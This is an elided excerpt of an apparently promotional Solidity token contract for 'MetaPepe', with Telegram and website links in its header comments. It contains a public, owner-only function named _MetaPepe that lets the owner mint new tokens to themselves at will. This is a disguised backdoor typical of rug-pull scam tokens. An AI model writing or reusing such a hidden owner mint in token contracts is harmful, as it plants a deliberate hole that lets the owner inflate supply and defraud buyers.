...
//
// $MetaPepe proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+vOOh62-L8Cg1NjY1
//  📱Website ::https://MetaPepe.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaPepe(uint256 amount) public onlyOwner {
 _MetaPepe(msg.sender, amount);
    }
    ...
    function _MetaPepe(address account, uint256 amount) internal virtual {
...
contract MetaPepe is ERC20 {
    ...
    constructor() public ERC20("Meta Pepe", "MetaPepe") {
     _MetaPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}